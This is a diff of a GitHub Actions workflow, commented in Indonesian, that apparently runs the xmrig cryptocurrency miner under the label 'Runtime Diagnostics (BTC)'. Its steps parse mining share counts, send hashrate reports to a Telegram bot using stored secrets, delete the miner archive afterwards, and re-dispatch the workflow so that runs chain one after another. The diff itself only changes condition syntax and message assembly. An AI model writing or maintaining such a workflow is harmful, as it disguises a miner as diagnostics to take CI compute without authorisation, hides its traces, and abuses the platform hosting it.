@@ -58,7 +58,7 @@ jobs:
           echo "Session selesai (≈${DURATION}s)"
 
       - name: Report & Cleanup
-        if: always()
+        if: ${{ always() }}
         env:
           TG_TOKEN: ${{ secrets.TG_TOKEN }}
           TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
@@ -69,18 +69,23 @@ jobs:
           ACC=$(grep -a "accepted" report.log | wc -l)
           REJ=$(grep -a "rejected" report.log | wc -l)
           HASH=${HASH:-"0 H/s"}
-          MSG="✅ Runtime Diagnostics (BTC) selesai
-• Hashrate: ${HASH}
-• Accepted: ${ACC}
-• Rejected: ${REJ}"
-          printf "%s" "$MSG" | curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
+
+          {
+            echo "✅ Runtime Diagnostics (BTC) selesai"
+            echo "• Hashrate: ${HASH}"
+            echo "• Accepted: ${ACC}"
+            echo "• Rejected: ${REJ}"
+          } > msg.txt
+
+          curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
             -d chat_id="${TG_CHAT_ID}" \
-            --data-urlencode text@-
+            --data-urlencode text@msg.txt
+
           cd ..
           rm -rf xmrig-6.24.0 core.tar.gz || true
 
       - name: Cooldown
-        if: always()
+        if: ${{ always() }}
         continue-on-error: true
         run: |
           trap 'echo "Cooldown diputus, lanjut finish."; exit 0' TERM INT
@@ -88,7 +93,7 @@ jobs:
           exit 0
 
       - name: Trigger Next (Starter)
-        if: always()
+        if: ${{ always() }}
         env:
           GH_TOKEN: ${{ github.token }}
         run: |
@@ -99,7 +104,7 @@ jobs:
             -d '{"ref":"main"}'
 
       - name: Queue Maintenance
-        if: always()
+        if: ${{ always() }}
         env:
           GH_TOKEN: ${{ github.token }}
         run: |
